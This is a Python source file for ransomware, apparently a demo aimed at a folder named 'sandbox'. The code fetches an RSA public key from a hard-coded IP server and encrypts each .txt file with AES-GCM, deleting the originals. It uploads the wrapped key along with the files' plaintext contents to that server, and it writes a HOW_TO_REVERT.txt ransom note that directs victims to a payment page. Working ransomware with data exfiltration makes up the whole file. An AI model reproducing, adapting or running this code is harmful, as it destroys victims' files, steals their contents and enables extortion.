import os
import uuid
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from keyclient import KeyClient
import base64
import shutil

FILE = ".machine_id"


def get_machine_id():
    if os.path.exists(FILE):
        data = open(FILE).read().strip()
        if data:
            return data

    mid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
    open(FILE, "w").write(mid)
    return mid


class HybridCrypto:
    def __init__(self):
        self.client = KeyClient(
            server_url="http://13.237.202.163:8000",
            machine_id=get_machine_id()
        )

        self.public_key = self.client.fetch_public_key()

        print("[INFO - excute] Generating RSA private key")
        self.private_key = RSA.generate(2048)
        print("[INFO - excute] RSA private key generated", self.private_key.export_key())

        self.aes_key = None

    def _aes_encrypt(self, data, key):
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        print("[INFO - excute] Data encrypted with AES", ciphertext, cipher.nonce, tag)
        return ciphertext, cipher.nonce, tag

    def _aes_decrypt(self, ct, key, nonce, tag):
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag)

    def _rsa_encrypt(self, data, pub):
        print("[INFO - excute] Encrypting data with RSA")
        return PKCS1_OAEP.new(pub).encrypt(data)

    def _rsa_decrypt(self, data, priv):
        print("[INFO - excute] Decrypting data with RSA")
        return PKCS1_OAEP.new(priv).decrypt(data)

    def encrypt_file(self, path):
        data = open(path, "rb").read()

        ct, nonce, tag = self._aes_encrypt(data, self.aes_key)


        enc_key = self._rsa_encrypt(self.aes_key, self.public_key)

        out_path = path + ".locked"

        with open(out_path, "wb") as f:
            for item in (enc_key, nonce, tag, ct):
                f.write(len(item).to_bytes(4, "big") + item)

        os.remove(path)
        return out_path

    def decrypt_file(self, path):
        with open(path, "rb") as f:
            kl = int.from_bytes(f.read(4), "big")
            enc_key = f.read(kl)

            nl = int.from_bytes(f.read(4), "big")
            nonce = f.read(nl)

            tl = int.from_bytes(f.read(4), "big")
            tag = f.read(tl)

            ct = f.read()

        aes_key = self._rsa_decrypt(enc_key, self.private_key)
        data = self._aes_decrypt(ct, aes_key, nonce, tag)

        out = path + ".decrypted"
        open(out, "wb").write(data)
        return out

    def encrypt_sandbox(self, folder):
        results = []

        self.aes_key = get_random_bytes(32)

        encrypted_aes_key = self._rsa_encrypt(self.aes_key, self.public_key)
        aes_key_base64 = base64.b64encode(encrypted_aes_key).decode()

        print("[INFO - excute] AES key encrypted and encoded to Base64", aes_key_base64)
        
        content = []

        for f in os.listdir(folder):
            if f.endswith(".txt"):
                full = os.path.join(folder, f)

                with open(full, "r", encoding="utf-8") as file:
                    file_content = file.read()

                content.append(file_content)
                results.append(self.encrypt_file(full))

        self.client.add_aes_key(
            machine_id=self.client.machine_id,
            aes_key=aes_key_base64,
            content="\n".join(content)
        )

        return results
    
    def add_guide(self, folder):
        guide_path = os.path.join(folder, "HOW_TO_REVERT.txt")
        with open(guide_path, "w") as f:
            f.write("How to Decrypt Files:\n")
            f.write("1. Access the link http://13.237.202.163/pay.html\n")
            f.write("2. Provide the machine ID found in '.machine_id'\n")
            f.write("3. Get .exe file + KEY.pem. Copy them to the same folder\n")
            f.write("4. Run the .exe + directory of encrypted files as argument\n")
            f.write("GOOD LUCK!")
        
        shutil.copy(guide_path, os.path.join(folder, "HOW_TO_REVERT.txt"))
        print("[INFO - excute] Guide added to sandbox folder")


if __name__ == "__main__":
    scaned_folder = "sandbox"
    crypto = HybridCrypto()
    files = crypto.encrypt_sandbox(scaned_folder)
    crypto.add_guide(scaned_folder)

    print("[INFO - excute] Encryption completed. Encrypted files:")
    print("\n".join(files))